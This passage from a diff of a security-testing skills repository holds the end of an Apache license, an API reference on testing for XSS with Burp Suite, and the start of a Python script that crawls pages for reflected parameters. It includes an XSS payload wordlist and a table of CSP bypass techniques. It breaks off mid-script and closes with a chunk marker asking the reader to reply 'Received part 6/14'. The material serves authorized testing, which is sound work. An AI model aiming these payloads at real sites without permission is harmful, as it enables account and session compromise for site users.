+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities-with-burpsuite/references/api-reference.md #####
+# API Reference: Testing for XSS Vulnerabilities with Burp Suite
+
+## Burp Suite Professional Components
+
+### Scanner
+- Active scan: Automatically tests parameters for XSS
+- Passive scan: Identifies reflected inputs and missing security headers
+- Scan configuration: XSS-focused audit checks
+
+### Repeater
+- Send individual requests for manual payload testing
+- Compare request/response pairs across payload variations
+- Test character encoding behavior
+
+### Intruder
+- Positions: Mark injectable parameters
+- Payloads: Load XSS wordlists
+- Grep-Match: Flag responses containing `alert(`, `onerror=`, `<script>`
+- Attack types: Sniper (single param), Battering Ram (same payload all positions)
+
+### DOM Invader
+- Built-in browser extension for DOM XSS testing
+- Canary injection and sink monitoring
+- Source-to-sink data flow tracing
+
+## requests Library (Companion Script)
+
+### Reflection Detection
+```python
+canary = "xsscanary12345"
+resp = requests.get(f"{url}?q={canary}")
+if canary in resp.text:
+    # Determine context and fuzz with payloads
+```
+
+### Character Encoding Test
+```python
+resp = requests.get(f'{url}?q={quote("<>\"\'&/")}'
+unencoded = [ch for ch in '<>"\'&/' if ch in resp.text]
+```
+
+## Burp Extensions for XSS
+| Extension | Purpose |
+|-----------|---------|
+| Hackvertor | Advanced payload encoding/transformation |
+| XSS Validator | Confirm XSS execution in headless browser |
+| Reflector | Highlight reflected parameters in proxy |
+| Active Scan++ | Enhanced active scanning rules |
+
+## CSP Bypass Techniques
+| Weakness | Bypass |
+|----------|--------|
+| `unsafe-inline` | Direct `<script>` injection |
+| `unsafe-eval` | Use `eval()`, `setTimeout()` |
+| Whitelisted CDN | JSONP callback or Angular gadgets |
+| Missing `base-uri` | `<base>` tag hijack for relative scripts |
+
+## References
+- Burp Suite docs: https://portswigger.net/burp/documentation
+- PortSwigger XSS labs: https://portswigger.net/web-security/cross-site-scripting
+- DOM Invader: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
+- Dalfox (CLI scanner): https://github.com/hahwul/dalfox
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities-with-burpsuite/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for XSS testing workflows complementing Burp Suite during authorized assessments."""
+
+import requests
+import re
+import json
+import argparse
+import urllib3
+from datetime import datetime
+from urllib.parse import urljoin, quote, urlparse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+XSS_WORDLIST = [
+    '<script>alert(document.domain)</script>',
+    '<img src=x onerror=alert(document.domain)>',
+    '<svg/onload=alert(document.domain)>',
+    '<body onload=alert(document.domain)>',
+    '<input onfocus=alert(document.domain) autofocus>',
+    '<marquee onstart=alert(document.domain)>',
+    '<details open ontoggle=alert(document.domain)>',
+    '"><img src=x onerror=alert(document.domain)>',
+    "'-alert(document.domain)-'",
+    "\\'-alert(document.domain)//",
+    '<ScRiPt>alert(document.domain)</sCrIpT>',
+    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
+]
+
+
+def find_reflection_points(base_url, token=None):
+    """Crawl pages and find parameters that reflect user input."""
+    print("[*] Finding reflection points...")
+    headers = {"Authorization": f"Bearer {token}"} if token else {}
+    reflections = []
+    try:
+        resp = requests.get(base_url, headers=headers, timeout=15, verify=False)
+        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
+                           resp.text, re.DOTALL | re.IGNORECASE)
+        for action, form_body in forms:
+            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_body, re.IGNORECASE)
+            for inp in inputs:
+                reflections.append({"url": action or base_url, "param": inp, "method": "GET"})
+        links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
+        for link in links[:20]:
+            parsed = urlparse(link)
+            params = dict(p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
+            for param in params:
+                reflections.append({"url": link.split("?")[0], "param": param, "method": "GET"})
+    except requests.RequestException as e:
+        print(f"  [-] Error crawling: {e}")
+    print(f"  [+] Found {len(reflections)} potential injection points")
+    return reflections
+
+
+def test_character_encoding(url, param, token=None):
+    """Test which special characters are reflected unencoded."""
+    headers = {"Authorization": f"Bearer {token}"} if token else {}
+    test_string = '<>"\'&/`()'
+    full_url = f"{url}?{param}={quote(test_string)}"
+    try:
+
+-----
+[END PART 6/14] — رد غير "Received part 6/14"
